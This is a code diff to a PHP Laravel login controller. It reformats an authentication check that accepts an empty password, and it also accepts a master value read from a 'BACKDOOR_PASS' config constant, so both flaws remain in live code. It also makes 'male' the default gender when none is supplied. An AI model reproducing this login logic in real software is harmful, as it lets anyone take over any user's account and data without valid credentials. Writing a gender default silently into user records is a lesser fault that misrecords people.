@@ -102,7 +102,7 @@ class LoginController extends Controller
     {
         $user = User::with('person')->where(array('username' => $request->get('username')))->first();
 
-        if ($user && ((!$request->get('password')) || Hash::check($request->get('password'), $user->password) || $request->get('password') == Config::get('constants.BACKDOOR_PASS')))
+        if ($user && (!$request->get('password') || Hash::check($request->get('password'), $user->password) || $request->get('password') == Config::get('constants.BACKDOOR_PASS')))
         {   
             $user->api_token = uniqid();
             $user->save();
@@ -121,6 +121,8 @@ class LoginController extends Controller
             
             if ($request->get('gender'))
                 $person->gender = $request->get('gender');
+            else
+                $person->gender = 'male';
             
             $person->email = $request->get('email');
             $person->save();
